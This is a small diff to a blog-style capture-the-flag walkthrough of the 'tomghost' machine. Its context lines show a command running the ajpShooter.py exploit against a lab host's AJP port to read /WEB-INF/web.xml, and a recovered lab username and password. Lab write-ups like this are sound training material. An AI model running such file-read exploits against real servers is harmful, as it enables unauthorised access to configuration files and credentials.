@@ -1,5 +1,5 @@
 ---
-layout: post
+
 title: Walkthrough - tomghost
 published: true
 ---
@@ -32,7 +32,7 @@ Identify recent vulnerabilities to try exploit the system or read files that you
 - this will read the XML file containing a users's ssh key
 - ``python3 ajpShooter.py http://10.10.35.112:8080 8009 /WEB-INF/web.xml read``
 
-![](/assets/tomghost01.png)
+![0xskar](/assets/tomghost01.png)
 
 - skyfuck:8730281lkjlkjdqlksalks
 
